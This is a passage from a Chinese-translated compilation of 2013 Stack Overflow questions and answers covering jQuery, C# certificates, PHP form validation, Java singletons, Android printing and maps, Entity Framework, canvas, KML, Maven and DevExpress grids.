 $(document).ready(function (e) {
        var x = e.pageX;
        var y = e.pageY;
        $(document).mousemove(function () {
            $.ajax({
                type: "POST",
                url: "get_position.php",
                data: {
                    pos_x: x,
                    pos_y: y
                }
            });
        });
    }); 
```

此代码使浏览器崩溃。这样做的正确方法是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T14:52:15.637

*您在每次*鼠标移动时都发送一个 AJAX 请求。那必须使任何浏览器崩溃。

相反，在每次鼠标移动时将鼠标坐标存储在某个变量上，但不要每次都将它们发送到服务器。定期将它们发送到服务器，例如每分钟左右一次。

即类似的东西：

```
var coords[0, 0];
$(document).mousemove(function (e) {
   coords = [e.pageX, e.pageY];
});

function sendThem() {
    $.ajax({
        type: "POST",
        url: "get_position.php",
        data: {
            pos_x: coords[0],
            pos_y: coords[1]
        }
    });
}

setInterval(sendThem, 1000); 
```

# c# - X509 找不到请求的对象

> ID：15526909
> 
> 赞同：8
> 
> 时间：2013-03-20T14:50:23.250
> 
> 标签：c#, x509certificate, x509

我在同一目录中有一个 certificate.cer 文件（如果较新则复制），其中包含 RSA 密钥，但当我尝试时：

```
string certificateFile = Environment.CurrentDirectory + "\\Certificate.cer";
X509Certificate2 x509 = new X509Certificate2(X509Certificate.CreateFromCertFile(certificateFile)); 
```

我也一样

> *“找不到请求的对象”*

错误。我怎么不能得到错误？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T15:25:02.187

您可以将文件名传递给 new() 方法。

尝试：

```
X509Certificate2 x509 = new X509Certificate2(certificateFile); 
```

如果证书有密码，您还必须提供此密码（其中`password`是字符串）：

```
X509Certificate2 x509 = new X509Certificate2(certificateFile, password); 
```

# php - 防止表单提交 PHP

> ID：15526911
> 
> 赞同：-3
> 
> 时间：2013-03-20T14:50:29.340
> 
> 标签：php, javascript

我不太了解 PHP，并制作了一个简单的表单，将数据发送到 txt 文件。我的问题是，如果某些字段未填写，我无法弄清楚如何阻止表单提交。有人可以指出我正确的方向吗？

我还有一个简单的 javascript，它使未填充的`textareas`红色变为红色并提醒用户正确填写表单，但我不想允许提交，因为它仍然将值作为空发送到 txt 文件。

```
<?php                       
    if(isset($_POST['button'])) {
        $myFile = 'demo.txt';
        $titel = $_POST['filmnamn'] . ";" ;
        $betyg = $_POST['betyg'] . ";" ;
        $link = $_POST['link'] . ";" ;
        $photo = $_POST['photo'] . ";" ;
        $desc = $_POST['description'] . ";" ;
        $data = "$titel$betyg$link$photo$desc";
        $fh = fopen($myFile, 'a');
        fwrite($fh, $data);

        fclose($fh);                        
}
?> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-20T14:53:08.427

要首先阻止表单提交，您需要 HTML 和 Javascript。因此，基本上，您将一个函数链接到提交按钮，并且仅在函数返回 true 时才提交。

```
<form action="..." method="post" onsubmit="return ValidatePage(this);"> 
```

```
 <script type="text/javascript">

    function ValidatePage(form) { // the form itself is passed into the form variable. You can choose not to use it if you want.
       // validating stuff.
    }

</script> 
```

此外，您将需要服务器端验证，以防万一有人是一个混蛋和转向 Javascript：

```
if ( !$title1) { echo "there has been an error" } // alternatively to the '!$title1' you can use empty($title1), which is what I use more often and may work better. Another possible alternative is to use a variable that you set to true if an error has occurred, that way the bulk of your code can be at the beginning.

else if... // repeat the if statement with else if for the remaining fields. 

else {...} // add the code to add to text file here. 
```

这里有一个更完整的例子：http: [//phpmaster.com/form-validation-with-php/](http://phpmaster.com/form-validation-with-php/)如果你向下滚动。

此外，您应该知道 PHP 没有办法阻止表单首先提交，您所能做的就是让表单不会“做”任何事情。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-20T14:55:06.817

您正在尝试做的事情称为服务器端验证。你应该做的是在任何事情之前测试你的变量。仅当 filemnamn 和 betyg 变量不为空时，这才会写入文件：

```
 <?php                     
                if(isset($_POST['button'])) {
                    if( $_POST['filmnamn'] != "" &&    $_POST['betyg'] != "") {
                    $myFile = 'demo.txt';
                    $titel = $_POST['filmnamn'] . ";" ;
                    $betyg = $_POST['betyg'] . ";" ;
                    $link = $_POST['link'] . ";" ;
                    $photo = $_POST['photo'] . ";" ;
                    $desc = $_POST['description'] . ";" ;
                    $data = "$titel$betyg$link$photo$desc";
                    $fh = fopen($myFile, 'a');
                    fwrite($fh, $data);

                    fclose($fh);   
                 }
                }
          ?> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T14:55:18.907

```
if ( !$title1 || !$betyg || !$link || !$photo || !$desc) {
//form + error message if blank
} else {
                        $fh = fopen($myFile, 'a');
                        fwrite($fh, $data);
                        fclose($fh);       
} 
```

以上将仅验证所有字段，而不是单个字段

# c++ - 如何获取局域网中所有 IP 地址的列表？

> ID：15526913
> 
> 赞同：0
> 
> 时间：2013-03-20T14:50:35.890
> 
> 标签：c++, winapi, networking

是否可以获得局域网中所有连接的 IP 地址的列表以及如何使用 winapi 完成？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T16:00:40.600

主机可以选择不响应 ICMP/PING 请求。但是，您可以计算出您自己的 IP 地址和子网掩码，然后遍历可能性并对它们运行地址解析协议 (ARP) 广播请求。主机必须对那些正常网络功能做出响应。如果您收到 MAC 地址响应，则说明您已匹配该 IP 地址。退房`SendARP`是Windows...

# java - 对单例模式使用双重检查锁定习语是否最佳？

> ID：15526915
> 
> 赞同：6
> 
> 时间：2013-03-20T14:50:37.140
> 
> 标签：java, synchronization, locking, singleton

对单例模式使用双重检查锁定习语会更好吗？还是同步方法？

IE：

```
private static volatile ProcessManager singleton = null;

public static ProcessManager getInstance() throws Exception {

    if (singleton == null) {
       synchronized (MyClass.class) {
          if (singleton == null) {
               singleton = new ProcessManager();
         }
      }
   }
   return singleton; 
```

}

或者

```
private static processManager singleton = null;

public synchronized static processManager getInsatnce() throws Exception {

   if(singleton == null) {
            singleton = new processManager();
    }

    return singleton
 } 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-20T14:54:27.177

让 ClassLoader 为您完成这项工作：

```
 /*
     * This solution takes advantage of the Java memory model's guarantees about class initialization
     * to ensure thread safety. Each class can only be loaded once, and it will only be loaded when it
     * is needed. That means that the first time getInstance is called, mySingletonServiceLoader
     * will be loaded and instance will be created, and since this is controlled by ClassLoaders,
     * no additional synchronization is necessary.
     */
    public static DocumentService getInstance() {
        return mySingletonServiceLoader.INSTANCE;
    }

    private static class mySingletonServiceLoader {
         static DocumentService INSTANCE = new DocumentService();
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T15:10:26.207

第一个选项是正确的双重检查锁定实现，但如果 ProcessManager 类中没有更多公共方法但 getInstance 那么你所需要的就是

```
public class ProcessManager {
  private static ProcessManager instance;
  static {
      instance = new ProcessManager();
  }

  private ProcessManager() {
  }

   public static ProcessManager getInstance() {
       return instance;
   }
} 
```

该类将在第一次 ProcessManager.getInstance() 调用时加载和初始化

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T14:53:16.667

基本上，您的第二个选项不会增加额外的保证。

您更频繁地检查，但它们之间仍可能发生并发访问，因此，您正在减少两个实例发生的可能性，但不会消除它。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-20T15:00:32.580

**第一个选项。**

可以创建单个实例的多个版本...

在`getInstance`() 调用中检查实例是否为`null`，如果为空则立即构造，然后`instance`返回 。

它应该是线程安全的。

也参考[这个](http://www.jguru.com/faq/view.jsp?EID=124425)。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-20T15:17:06.310

**如果需要延迟加载**，我会坚持仔细检查而不是同步方法。最后，问题在于[volatile 与 synchronized](https://stackoverflow.com/questions/3519664/difference-between-volatile-and-synchronized-in-java-j2me)：

> 易失性，只是强制对易失性变量的所有访问（读取或写入）都发生在主内存中，有效地将易失性变量排除在 CPU 缓存之外。这对于一些只要求变量的可见性正确且访问顺序不重要的操作可能很重要。

一旦实例被初始化，同步块将不会被执行（但对于竞争条件）。唯一需要支付的并发成本是对 volatile 变量的单次读取。

请注意，在*Effective Java* Bloch 中说，在局部变量中加载 volatile 字段可以提高性能（我理解这是因为 volatile 读取较少）

```
 public static ProcessManager getInstance() throws Exception {
  ProcessManager result = singleton;
  if (result == null) {
     synchronized (MyClass.class) {
        result = singleton;
        if (result == null) {
           singleton = result = new ProcessManager();            
        }
  }
  return result;
} 
```

# android - Zebra EM 220，使用 Android 打印图像

> ID：15526916
> 
> 赞同：0
> 
> 时间：2013-03-20T14:50:40.083
> 
> 标签：android, printing, zebra-printers

我想用 Zebra EM220 从我的 SD 卡打印图像。我尝试使用 `GraphicsUtil.printImage("image path", 0, 0)` 但我所有的尝试都失败了，我只能打印一个字符列表。

第一次，我尝试使用它：

```
ZebraPrinter zp = ZebraPrinterFactory.getInstance(printerCo);
zp.getGraphicsUtil().printImage(path, 0, 0); 
```

但结果是 ZebraLanguageUnknownException。
所以我遵循了这个解决方案：[https](https://km.zebra.com/kb/index?page=content&id=SO8239&actp=LIST_RECENT) ://km.zebra.com/kb/index?page=content&id=SO8239&actp=LIST_RECENT但只打印了一个字符列表。

我不知道如何解决这个问题，所以如果有人成功使用 Zebra EM 220 打印图像并且可以共享代码，它应该对我有所帮助。

我的代码：

```
public void print(){
    String path = Environment.getExternalStorageDirectory().getAbsolutePath() + "/myimage.jpg";
    ZebraPrinterConnection printerCo = new BluetoothPrinterConnection(printerMacAdress);
    try {
        printerCo.open();
        if (printerCo.isConnected()){
            ZebraPrinter zp = new ZebraPrinterCpcl(printerCo);
            zp.getGraphicsUtil().printImage(path, 0, 0);
            Thread.sleep(500);
        }               
    } catch (ZebraPrinterConnectionException e) {
        e.printStackTrace();
    } catch (InterruptedException e) {
        e.printStackTrace();
    } finally {
        try{
            // Close the connection to release resources.
            printerCo.close();
        } catch (ZebraPrinterConnectionException e) {
            e.printStackTrace();
        }
    }
} 
```

}

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T19:46:57.767

您在使用 ZebraLink SDK 吗？如果是这样，它不支持 EM220。ZebraLink SDK 设计用于 CPCL 和 ZPL 打印机。您可以在此处查看支持的打印机列表：（单击中间的兼容打印机链接）：[http ://www.zebra.com/us/en/products-services/software/adapt-software/zebralink-sdk-android .html#mainpartabscontainer_71ac=下载](http://www.zebra.com/us/en/products-services/software/adapt-software/zebralink-sdk-android.html#mainpartabscontainer_71ac=downloads)。

对于 EM 220，您应该改用 Zebra 的 EM 220 SDK for Android（底部链接）：[http](http://www.zebra.com/us/en/support-downloads/mobile/em-220.html) ://www.zebra.com/us/en/support-downloads/mobile/em-220.html 。

下面是一段示例代码（来自 Zebra 的知识库），它解释了通过此 SDK 打印到 EM 220 的一种方法：[https ://km.zebra.com/kb/index?page=answeropen&type=open&searchid=1363808738897&answerid=16777216&iqaction =5&url=https%3A%2F%2Fkm.zebra.com%2Fkb%2Findex%3Fpage%3Dcontent%26id%3DSA316%26actp%3Dsearch%26viewlocale%3Den_US&highlightinfo=4194576,157,181#](https://km.zebra.com/kb/index?page=answeropen&type=open&searchid=1363808738897&answerid=16777216&iqaction=5&url=https%3A%2F%2Fkm.zebra.com%2Fkb%2Findex%3Fpage%3Dcontent%26id%3DSA316%26actp%3Dsearch%26viewlocale%3Den_US&highlightinfo=4194576,157,181#)。

# android - 如何在 android google maps v2 中使地图对象（例如：圆圈）可点击？

> ID：15526925
> 
> 赞同：2
> 
> 时间：2013-03-20T14:50:52.423
> 
> 标签：android, google-maps, google-maps-android-api-2

Google 最近在 V2 中引入了圆圈作为地图对象，可以轻松绘制： [https ://developers.google.com/maps/documentation/android/shapes#circles](https://developers.google.com/maps/documentation/android/shapes#circles)

有谁知道如何使它可点击，以便我可以打开信息窗口等...？

非常感谢您的帮助。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2016-06-27T20:05:48.950

自 2016 年 6 月起，Google 引入了 CircleOptions 的可点击属性。

[https://developers.google.com/android/reference/com/google/android/gms/maps/model/CircleOptions#public-constructor-summary](https://developers.google.com/android/reference/com/google/android/gms/maps/model/CircleOptions#public-constructor-summary)

您也可以使用 Circle.setClickable(boolean) 方法并监听 OnCircleClickListener 事件。

[https://developers.google.com/android/reference/com/google/android/gms/maps/model/Circle.html#public-methods](https://developers.google.com/android/reference/com/google/android/gms/maps/model/Circle.html#public-methods)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-03-20T18:02:43.747

**更新：**

您可能应该使用`GoogleMap::setOnCircleClickListener`.

**老答案：**

对于 Circles，它应该很容易：使用 OnMapClickListener 和这段代码：

```
void onMapClick(LatLng position) {

    LatLng center = circle.getCenter();
    double radius = circle.getRadius();
    float[] distance = new float[1];
    Location.distanceBetween(position.latitude, position.longitude, center.latitude, center.longitude, distance);
    boolean clicked = distance[0] < radius;

} 
```

如果你有更多的圆圈，你当然可以迭代它们。

对于其他人，您必须自己编写代码检查。Polygon 的算法在网上不难找到。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2017-07-04T06:15:01.970

这非常简单 - mMap.setOnCircleClickListener(this);

# .net - 可查询的评估

> ID：15526940
> 
> 赞同：1
> 
> 时间：2013-03-20T14:51:18.223
> 
> 标签：.net, entity-framework, linq-to-sql, lazy-evaluation

我是 EF/Linq-To-SQL 的新手。我之前在 SO 上读到过，IQueryable 比 IEnumerable 更有利，因为它可以进行惰性求值。关于以下简单示例：

```
var records = db.Employees.Where(x => x.EmployeeID == "3" );

if (records.Any())
{
     var topRecord = records.First();
} 
```

IQueryable 表达式是否被计算了两次？一次检查结果集中的任何元素，一次检索第一个元素？如果是这样，是否有更有效的方法来执行这种选择？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-20T14:54:49.003

是的，在这种情况下，查询将执行两次：首先是 for `Any`，然后是 for `First`。

您可能可以[`FirstOrDefault`](http://msdn.microsoft.com/en-us/library/bb357733.aspx)改用：

```
var topRecord = db.Employees.FirstOrDefault(x => x.EmployeeID == "3" );
// topRecord will be null if there's no match

if (topRecord != null)
{
  ...
} 
```

# javascript - 在 HTML5 画布中，如何用我选择的背景屏蔽图像？

> ID：15526943
> 
> 赞同：11
> 
> 时间：2013-03-20T14:51:24.010
> 
> 标签：javascript, html, canvas, png, masking

我试图用 canvas' 做到这一点`globalCompositeOperation`，但没有运气，所以我在这里问。这里有类似的问题，但我没有在其中找到我的案例。

我的画布区域中有图层（从下到上的绘制顺序）：

*   画布底部填充纯白色（#fff，带fillRect）
*   第一张图片`house`是房子的照片。背景是透明的。（见下文）
*   第二张图片`roofOverlay`是覆盖“遮罩”的图片，屋顶区域为红色（可以是任何颜色，但为清晰起见为红色，见下文）

两张图片都占据了整个画布，并完美地排列在一起，这样红色的屋顶区域就与房子相匹配。

然后我有一个重复的背景`repeatPattern`图案，我只想在红色区域内使用*：*用`repeatPattern`. （可以是任何东西，但假设是六边形或其他）

在伪代码中，理想情况下是这样的：

```
roofOverlay.maskBackground(repeatPattern) 
```

（在旁注中，我也希望能够弄乱背景图案 HSL 值，但我认为一旦我得到图案甚至显示这很简单）

## 预期结果：

预期的结果将是一栋屋顶带有 repeatPattern 图像纹理的房子。

**注意**：我知道带有蒙版的剪切路径，但我不能在这里使用它们。这个例子被简化了，为多个不同的房子绘制所有的路径将是太多的工作。我只有屋顶的覆盖 png 文件。

## 图片供参考

![房子](../Images/bead55e690470059f9b677b9e2801683.png) `house`

* * *

![房子屋顶覆盖](../Images/db6188d8a5b032f292625f4642663888.png) `roofOverlay`

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2013-03-20T18:48:02.530

# jquery - 在滚动时淡入新的背景图像

> ID：15526944
> 
> 赞同：0
> 
> 时间：2013-03-20T14:51:24.560
> 
> 标签：jquery, scroll, background-image, fade

当用户向下滚动页面时，我试图让背景图像淡入/淡出。从长远来看，我正在使用几个背景图像拍摄延时效果。我的背景图像在滚动时发生了变化，但我似乎无法让它们从一个渐变到下一个。

这是我到目前为止所得到的 - [jsFiddle](http://jsfiddle.net/apaul34208/pELeh/1/)

```
 $(document).scroll(function () {
if ($(this).scrollTop() > 1) {
    $('body').css({
        backgroundImage: 'url("http://s3.amazonaws.com/dfc_attachments/images/3237846/sun1_web.png")'
    });
}
if ($(this).scrollTop() > 250) {
    $('body').css({
        backgroundImage: 'url("http://s3.amazonaws.com/dfc_attachments/images/3237850/sun2_web.png")'
    });
}
if ($(this).scrollTop() > 500) {
    $('body').css({
        backgroundImage: 'url("http://s3.amazonaws.com/dfc_attachments/images/3237854/sun3_web.png")'
    });
}
if ($(this).scrollTop() > 750) {
    $('body').css({
        backgroundImage: 'url("http://s3.amazonaws.com/dfc_attachments/images/3237858/sun4_web.png")'
    });
}

}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T13:54:15.180

对于遇到此问题的任何其他人，这是它的工作原理。

```
 $(document).scroll(function () {
var y = $(this).scrollTop();
if (y > 150) {
    $('#img2').fadeIn();
}
else {$('#img2').fadeOut('fast')};

if (y > 300) {
    $('#img3').fadeIn();
}
else {$('#img3').fadeOut('fast')};

if (y > 450) {
    $('#img4').fadeIn();
}
else {$('#img4').fadeOut('fast')};
}); 
```

[jsFiddle](http://jsfiddle.net/apaul34208/pELeh/5/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T14:54:29.457

您不能为`background-image`属性设置动画。取而代之的是，使用标准`<img>`标签渲染图像并将它们淡入淡出。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-05-30T06:01:43.597

将其与垂直滚动站点的一些错误拍摄一起使用，当用户向下滚动时，在每个“级别”替换图像。我试图使用 SuperScrollorama，但在玩了一个小时后我放弃了。这对于简单的垂直“讲故事”风格的网站非常有用。

因此，首先，在标题中：

```
 <script type="text/javascript" src="http://code.jquery.com/jquery-1.9.1.js"></script>
    <script type="text/javascript">//<![CDATA[ 
    $(window).load(function(){
    $(document).scroll(function () {
        var y = $(this).scrollTop();
        if (y > 1013) {
            $('#machine1swap').fadeIn('slow');
        }
        else {$('#machine1swap').fadeOut('fast')};

        if (y > 2119) {
            $('#machine2swap').fadeIn('slow');
        }
        else {$('#machine2swap').fadeOut('fast')};

        if (y > 3216) {
            $('#machine3swap').fadeIn({});
        }
        else {$('#machine3swap').fadeOut('fast')};
    });
    });//]]> 
    </script> 
```

和 HTML

```
<body>
<div id="whole_body">
  <div id="centre_zone">
    <img src="images/1.jpg" width="960" height="822" /><img src="images/2.png" width="960" height="591" />
    <div id="machine1"><div id="machine1swap"><img src="images/3_swap2.jpg" width="960" height="450" /></div><img src="images/3_swap1.jpg" width="960" height="450" /></div>
    <img src="images/4.png" width="960" height="656" />
    <div id="machine2"><div id="machine2swap"><img src="images/5_swap2.jpg" width="960" height="462" /></div><img src="images/5_swap1.jpg" width="960" height="462" /></div>
    <img src="images/6.png" width="960" height="635" />
    <div id="machine3"><div id="machine3swap"><img src="images/7_swap2.jpg" width="960" height="442" /></div><img src="images/7_swap1.jpg" width="960" height="442" /></div>
    <img src="images/8_footer.png" width="960" height="392" border="0" usemap="#Map" />
  </div>
</div>

</body> 
```

您需要编辑标题中的“（y > xxxx）”部分以淡入页面需要它的任何位置。我将交换上方的两个图像相加并减去 400 使其淡入屏幕底部。

对于大多数程序员来说，这可能看起来很愚蠢，但我希望它可以帮助像我这样的任何其他菜鸟正确地做到这一点。

# kml - 如何设置 KML 地标的地图点？

> ID：15526945
> 
> 赞同：0
> 
> 时间：2013-03-20T14:51:32.827
> 
> 标签：kml

我目前正在使用 geoXML3 工具在 Google 地图上放置自定义标记。我对这一切的运作方式以及即时生成 KML 并将标记显示在我的地图上的便利性感到非常满意。

由于我的标记是自定义的，因此每个标记的“原点”不一定相同。当标记放置在地图上时，KML 是否可以指定用作原点的像素位置？

例如，我所有的自定义标记都是 32x32 PNG。但实际可见图像是 8x24，以 32x32 区域为中心。我希望此标记的原点为 (16,28)，以便可见图像的底部放置在 KML Placemark 属性中指定的点处。

有任何想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T15:14:43.613

在 KML 中定义它的方法是使用[热点标签](https://developers.google.com/kml/documentation/kmlreference#hotspot)

```
<hotSpot x="0.5" y="0.5" xunits="fraction" yunits="fraction">
    Specifies the position within the Icon that is "anchored" to the <Point> specified in the Placemark. The x and y values can be specified in three different ways: as pixels ("pixels"), as fractions of the icon ("fraction"), or as inset pixels ("insetPixels"), which is an offset in pixels from the upper right corner of the icon. The x and y positions can be specified in different ways—for example, x can be in pixels and y can be a fraction. The origin of the coordinate system is in the lower left corner of the icon.

        x - Either the number of pixels, a fractional component of the icon, or a pixel inset indicating the x component of a point on the icon.
        y - Either the number of pixels, a fractional component of the icon, or a pixel inset indicating the y component of a point on the icon.
        xunits - Units in which the x value is specified. A value of fraction indicates the x value is a fraction of the icon. A value of pixels indicates the x value in pixels. A value of insetPixels indicates the indent from the right edge of the icon.
        yunits - Units in which the y value is specified. A value of fraction indicates the y value is a fraction of the icon. A value of pixels indicates the y value in pixels. A value of insetPixels indicates the indent from the top edge of the icon. 
```

# javascript - 使用javascript自动刷新Rails 3中的页面

> ID：15526946
> 
> 赞同：2
> 
> 时间：2013-03-20T14:51:32.863
> 
> 标签：javascript

我在我的 Rails 应用程序中有一个视图：blah.app/units/status

这将显示我所有单位的状态。我想让页面通过 javascript 自动刷新，但我不知道该怎么做。

我试着写这个，但它没有重新加载：

```
<script>
  $(function() {
    setInterval(function(){
      $.getScript("/units/status");
    }, 10000);
  });
</script> 
```

有人可以指出我在这里出错的地方吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T14:55:36.940

```
$(document).ready(function() {
  setTimeout(function() {
    window.location.reload();
  }, 10000);
}); 
```

# java - Maven 和 m2e - 使用依赖信息构建 jar

> ID：15526956
> 
> 赞同：1
> 
> 时间：2013-03-20T14:51:50.793
> 
> 标签：java, maven, jar

我们正在使用`Maven`和`m2e`工具进行开发，今天我们遇到了一个问题。

我们的一个项目是其他项目所需的小型库，因此我们将其打包成 jar 文件并放入我们的私有`Maven`存储库中。

目前，我们放在这个存储库中的所有 jar 都没有任何外部依赖项，但是我提到的这个库使用了一些外部 jar。

现在，当我将有关此 jar 的信息添加到其他 pom 时，此 jar 是从我们的私有存储库下载的，但 Maven 不会下载此 jar 所需的依赖项。

我想知道是否需要使用一些特殊的目标/在我的`pom.xml`文件中添加一些东西，这将通知`Maven`包含有关此工件所需的依赖项的信息。

编辑：这是我将 jar 上传到我们的私有存储库时执行的工作流程：

`Eclipse`1.我使用生成jar文件`m2e`

2.`mvn install:install-file -DgroupId=<your_group_name> -DartifactId=<your_artifact_name> -Dversion=<snapshot> -Dfile=<path_to_your_jar_file> -Dpackaging=jar -DgeneratePom=true -DcreateChecksum=true`

3.我将在本地存储库中创建的文件夹复制到远程存储库

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T15:01:08.560

我看到你`-DgeneratePom=true`在安装jar文件的过程中使用。您需要做的是`pom.xml`为您的工件创建一个。在 pom.xml 中，您可以指定 jar 文件所需的依赖项。执行`install:install`插件目标时，您使用`-DpomFile=pom.xml`。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-20T15:03:53.523

如果您的小型库是您所说的 maven 项目，则应该没有理由让 eclipse 构建 jar，然后使用 maven 安装它，然后手动复制到远程仓库。相反，您应该使用 m2e 来运行部署目标：

```
mvn deploy 
```

这将导致构建 jar，然后将其直接安装到本地 maven 存储库中，然后将其部署到远程存储库。

在eclipse中，这可以通过右键单击您的项目来完成，`Run As -> Maven Build...`然后在运行配置窗口中选择`Goals`输入类型`deploy`，然后单击`Run`。完成一次后，您可以使用`Run As -> Maven Build`再次运行相同的配置。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-20T15:08:32.960

最好的方法是运行`mvn deploy`

您必须在 settings.xml 中将分发存储库设置为您的私有工件管理器（nexus 或工件）

有关更多详细信息，请参阅[此](http://maven.apache.org/pom.html#Distribution_Management)

# c# - 使用 Html Agility Pack 从文本内 URL 创建 Html 链接

> ID：15526957
> 
> 赞同：1
> 
> 时间：2013-03-20T14:51:50.943
> 
> 标签：c#, html-agility-pack

如何使用 Html Agility Pack + c# 将文本中的 url 转换为 html 链接？

例如：“www.stackoverflow.com 是一个非常酷的网站。”

输出：

```
"<a href="www.stackoverflow.com">www.stackoverflow.com</a>  is a very cool site." 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-25T13:11:50.217

感谢@user1778606 的回答。尽管它仍然使用了一些正则表达式，但我得到了这个工作。它工作得更好更安全（即它永远不会在超链接和 href 属性中创建超链接）。

```
 //convert text to html
        HtmlAgilityPack.HtmlDocument doc = new HtmlAgilityPack.HtmlDocument();
        doc.LoadHtml(inputString);

        // \w* - means it can start with any alphanumeric charactar
        // \s+ - was placed to replace all white spaces (when there is more than one word).
        // \b - set bounderies for the keyword
        const string pattern = @"((([A-Za-z]{3,9}:(?:\/\/)?)(?:[-;:&=\+\$,\w]+@)?[A-Za-z0-9.-]+|(?:www.|[-;:&=\+\$,\w]+@)[A-Za-z0-9.-]+)((?:\/[\+~%\/.\w-_]*)?\??(?:[-\+=&;%@.\w_]*)#?(?:[.\!\/\\w]*))?)";

        //get all elements text propery except for anchor element 
        var nodes = doc.DocumentNode.SelectNodes("//text()[not(ancestor::a)]") ?? new HtmlAgilityPack.HtmlNodeCollection(null);

        foreach (var node in nodes)
        {
            Regex regex = new Regex(pattern, RegexOptions.IgnoreCase);
            node.InnerHtml = regex.Replace(node.InnerHtml, "<a href=\"$1\">$1</a>").Replace("href=\"www", "href=\"http://www");
        }

        return doc.DocumentNode.OuterHtml; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-24T00:35:06.710

我很确定它是可能的，虽然我没有尝试过。

以下是如何用链接替换文档中的固定字符串

> [当关键字匹配某些条件时在文本中查找关键字 - C#](https://stackoverflow.com/questions/14585100/find-keyword-in-text-when-keyword-match-certain-conditions-c-sharp/14685004#14685004)

继承人如何正则表达式的网址

> [url 的正则表达式](https://stackoverflow.com/questions/833469/regular-expression-for-url)

把它们放在一起，它应该是可能的。

伪代码

> 选择所有文本节点
> 
> > 对于每个节点
> > 
> > > 为找到的每个 url 获取内部文本
> > > 在文本中查找 url（使用正则表达式？）
> > > 
> > > > 用字符串文字链接标记替换 url 的文本（a href = etc ...）

# git - 在空格缩进项目中使用制表符缩进

> ID：15526958
> 
> 赞同：0
> 
> 时间：2013-03-20T14:51:56.573
> 
> 标签：git, editor, sublimetext2, indentation

我最近一直在尝试使用比例字体和制表符缩进。问题是我从事的一些项目是用空格缩进的（2 用于 Ruby，4 用于 JavaScript）。

我想要做的是使用制表符缩进**阅读和编辑**文件，但实际上使用空格缩进**与我的团队成员共享它们。**我们使用**git**进行源代码控制，我使用**Sublime Text 2**作为编辑器。

**有没有人试过这个？**

让编辑器控制缩进会更好还是我应该让 git 处理它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-26T11:25:06.370

因此，解决方案是为此使用**git**，就像它记录在[git 可以自动在空格和制表符之间切换吗？](https://stackoverflow.com/q/2316677/146272)

# c# - 在 EditorRow 中更改文本颜色

> ID：15526959
> 
> 赞同：0
> 
> 时间：2013-03-20T14:51:56.960
> 
> 标签：c#, colors, devexpress

我可以更改 VGridControl 中所有记录的颜色。

`vGridControl1.Appearance.ReadOnlyRecordValue.ForeColor`

但我不知道如何只改变一排的颜色。

```
EditorRow row = new EditorRow(id);
row.Name = "row" + id;
row.Properties.Row.Appearance.ForeColor = ColorText;
row.Properties.Row.Appearance.Options.UseForeColor = true; 
```

我试着做点什么。但它是行不通的。请帮帮我。

好吧，如果我使用事件 CustomDrawRowHeaderCell，我可以更改标题的颜色。代码：

```
private void vGridControl1_CustomDrawRowHeaderCell(object sender, DevExpress.XtraVerticalGrid.Events.CustomDrawRowHeaderCellEventArgs e)
    {
        try {
            System.Drawing.Color ColorText = Color.FromArgb(m_Color.r, m_Color.g, m_Color.b);
            e.Row.Appearance.ForeColor = ColorText;
        }
        catch (Exception ex)
        { }
    } 
```

但是，当我尝试更改文本行颜色时，我遇到了问题：我无法更改文本行颜色。但我可以更改行背景颜色。谁能帮我？代码：

```
 private void vGridControl1_CustomDrawRowValueCell(object sender, DevExpress.XtraVerticalGrid.Events.CustomDrawRowValueCellEventArgs e)
    {
        try
        {
            System.Drawing.Color ColorText = Color.FromArgb(m_Color.r, m_Color.g, m_Color.b);
            e.Row.Appearance.ForeColor = ColorText;
            e.Row.Appearance.Options.UseForeColor = true;
            e.Row.Appearance.BackColor = ColorText;
        }
        catch (Exception ex)
        { }
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T06:27:48.077

在这里，我在 VGridControl 中插入 Row。我可以在此功能中更改文本颜色吗？

```
enter code here

 private void InsertNewRow(string id, string text, int type)
    {
        EditorRow row = new EditorRow(id);
        row.Name = "row" + id;
        row.Properties.ImageIndex = type;
        //vGridControl1.Appearance.ReadOnlyRecordValue.ForeColor = ColorText;
        M_Objects myColorObject = new M_Objects();
        if (GetObjectById(id, ref myColorObject) >= 0)
        {
            m_Color = myColorObject.Color;
        }
        System.Drawing.Color ColorText = Color.FromArgb(m_Color.r, m_Color.g, m_Color.b);
        row.Appearance.ForeColor = ColorText;//here I try to change color
        row.Appearance.Options.UseForeColor = true;//It does not work

        if (vGridControl1.RepositoryItems.Count == 0)
            vGridControl1.RepositoryItems.Add("TextEdit");
        row.Properties.RowEdit = vGridControl1.RepositoryItems[0];
        row.Properties.Value = text;

        row.Height = 28;
        row.Properties.ReadOnly = true;
        vGridControl1.Rows["MainRow"].ChildRows.Add(row);//I don't write this code. Is it right?
    } 
```

* * *

## 回答 #2

